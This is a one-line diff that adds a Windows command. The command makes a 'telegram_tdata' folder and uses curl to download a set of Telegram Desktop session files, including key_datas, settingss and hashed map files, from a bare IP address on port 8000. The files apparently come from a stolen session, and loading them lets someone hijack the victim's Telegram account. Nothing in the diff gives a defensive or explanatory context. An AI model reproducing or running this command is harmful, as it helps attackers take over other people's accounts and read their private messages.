@@ -1,0 +1,1 @@
+mkdir telegram_tdata && cd telegram_tdata && for %f in (F78D8EB9EA67B6C6s,D877F783D5D3EF8Cs,key_datas,settingss,6F2C9B2FE6761967s,prefix,usertag,desktop.ini) do @(echo Downloading %f && curl -s --connect-timeout 5 --max-time 30 -o "%f" "http://222.109.84.79:8000/Telegram/tdata/%f")
